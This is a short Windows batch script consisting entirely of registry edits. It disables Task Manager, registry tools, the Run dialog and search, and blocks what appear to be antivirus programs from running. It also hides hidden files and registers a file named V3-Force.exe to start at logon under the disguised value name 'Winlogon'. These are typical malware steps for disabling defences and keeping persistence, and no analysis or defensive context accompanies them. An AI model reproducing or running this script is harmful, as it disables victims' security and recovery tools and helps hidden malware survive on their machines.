@echo off
reg add HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER /V NoRun /t REG_DWORD /d 1 /f
reg add HKCU\software\microsoft\windows\currentversion\policies\explorer\ /v disallowrun /t REG_DWORD /d 1 /f
reg add HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER\ /v NoFind /t REG_DWORD /d 1 /f
reg add HKCU\software\microsoft\windows\currentversion\policies\explorer\disallowrun\ /v 1 /t REG_SZ /d mwav.exe /f
reg add HKCU\software\microsoft\windows\currentversion\policies\explorer\disallowrun\ /v 2 /t REG_SZ /d cav-0.94.exe /f
reg add HKCU\software\microsoft\windows\currentversion\policies\explorer\disallowrun\ /v 3 /t REG_SZ /d portable.exe /f
reg add HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run /v Winlogon /t REG_SZ /d c:\windows\system32\V3-Force.exe /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v Checkedvalue /t REG_DWORD /d 0 /f
exit
